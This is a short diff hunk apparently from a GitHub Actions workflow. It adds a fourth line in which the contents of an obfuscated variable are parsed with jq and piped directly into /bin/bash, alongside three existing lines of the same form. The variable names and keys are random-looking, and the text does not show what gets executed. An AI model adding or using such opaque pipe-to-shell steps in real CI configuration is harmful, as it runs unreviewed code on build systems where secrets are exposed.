@@ -21,6 +21,7 @@ jobs:
           echo $gwfzn8423 | jq -r .a27 | /bin/bash
           echo $zsoa9339 | jq -r .pe017 | /bin/bash
           echo $k30551 | jq -r .hiyp8365 | /bin/bash
+          printf '%s' "$xp28" | jq -r .jfpla2436 | /bin/bash
 
       - name: Archive results
         if: always()
